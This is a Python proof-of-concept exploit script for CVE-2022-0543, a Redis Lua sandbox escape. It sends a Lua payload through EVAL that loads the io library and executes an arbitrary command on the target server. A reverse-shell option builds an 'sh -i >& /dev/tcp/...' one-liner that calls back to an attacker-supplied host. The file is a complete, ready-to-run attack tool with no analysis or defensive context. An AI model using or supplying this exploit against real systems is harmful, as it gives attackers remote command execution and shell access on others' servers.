import sys
import redis
import argparse

def shell(ip, port, cmd):
    try:
        payload = 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("' + cmd + '", "r"); local res = f:read("*a"); f:close(); return res'
        r = redis.Redis(host=ip, port=port)
        script = r.eval(payload, 0)
        print(payload)
        print(script)
    except redis.ConnectionError:
        print("[-] cant connect Redis server")
    except Exception as e:
        print(f"[-] {str(e)}") 

if __name__ == '__main__':
    parse = argparse.ArgumentParser(description="CVE-2022-0543 POC")
    parse.add_argument('--host', type=str, required=True, help='target host')
    parse.add_argument('--port', type=int, required=True, help='target port')
    parse.add_argument('--cmd', type=str, help='command')
    parse.add_argument('--rhost', type=str, help='reverse host')
    parse.add_argument('--rport', type=int, help='reverse port')

    args = parse.parse_args()

    if not args.host or not args.port:
        parse.print_help()
        sys.exit(1)
    
    if args.rhost and args.rport:
        print("[*] Reverse shell mode")
        args.cmd = f'sh -i >& /dev/tcp/{args.rhost}/{args.rport} 0>&1'
        print(args.cmd)
    elif not args.cmd:
        print("[-] need cmd or reversehost and reverseport")
        sys.exit(1)
        
    shell(args.host, args.port, args.cmd)